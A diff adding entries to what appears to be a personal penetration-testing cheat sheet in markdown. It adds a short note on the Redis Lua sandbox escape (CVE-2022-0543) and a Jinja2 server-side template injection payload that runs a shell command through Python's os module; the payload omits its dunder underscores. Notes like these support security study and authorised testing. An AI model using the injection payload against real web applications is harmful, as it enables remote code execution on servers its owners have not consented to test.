@@ -69,6 +69,23 @@ header("Location: http://site.com")
 Start up a local server `php -S <ip>:<port>`    
 Query the script file from the victim site
 
+
+# Redis - Lua sandbox escape vulnerability (CVE-2022-0543)
+**CVE-2022-0543** - Eval command in Redis allows for RCE, hence being able to read files owned by others.
+## References
+- [https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/#](https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/#)
+
+
+
+# Flask (Jinja 2) RCE
+Server side template injection RCE
+```python
+{{request.application.globals.builtins.import('os').popen('id').read()}}
+```
+## References
+- [https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
+
+
 # Tomcat
 Help from: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
 ## Default credentials
